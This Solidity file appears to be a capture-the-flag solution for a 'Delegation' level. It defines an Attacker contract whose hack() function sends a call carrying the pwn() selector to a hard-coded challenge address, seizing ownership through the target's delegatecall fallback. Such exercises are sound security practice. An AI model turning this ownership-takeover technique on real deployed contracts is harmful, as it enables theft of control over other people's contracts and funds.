// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level06.sol";

contract Attacker
{
    Delegation level06 = Delegation(0x9195EE144c2Fbd6B3EBC0FC085fe4769e214a542);
    address myOwner = msg.sender;

    function hack() external
    {
        (bool success, ) = address(level06).call(abi.encodeWithSignature("pwn()"));
        require(success, "call not successful");
    }
}